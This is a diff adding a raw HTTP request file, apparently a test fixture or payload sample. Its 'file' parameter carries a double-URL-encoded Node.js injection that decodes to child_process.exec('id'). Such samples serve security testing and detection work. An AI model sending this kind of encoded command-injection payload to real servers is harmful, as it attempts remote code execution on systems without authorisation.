@@ -1,0 +1,4 @@
+GET /a?file=n%253Dchild_process.exec%2528%2527id%2527%2529 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
